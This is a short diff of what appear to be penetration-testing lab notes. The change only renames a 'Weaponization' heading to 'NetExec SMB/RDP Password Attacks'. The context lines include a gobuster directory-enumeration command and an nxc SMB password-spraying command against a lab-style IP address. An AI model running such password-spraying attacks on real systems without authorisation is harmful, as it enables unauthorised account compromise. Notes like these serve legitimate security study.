@@ -140,7 +140,7 @@ gobuster dir -u http://10.20.10.31 -w /usr/share/wordlists/seclists/Discovery/We
 
 ```
 # Section 3. Weaponization
- - NXC SMB/RDP Password Attacks
+ - NetExec SMB/RDP Password Attacks
 ```
 # Password Spraying Attack
 nxc smb 10.129.2.28 -u users.txt -p password1 password2 password3 password4 –-ignore-pw-decoding
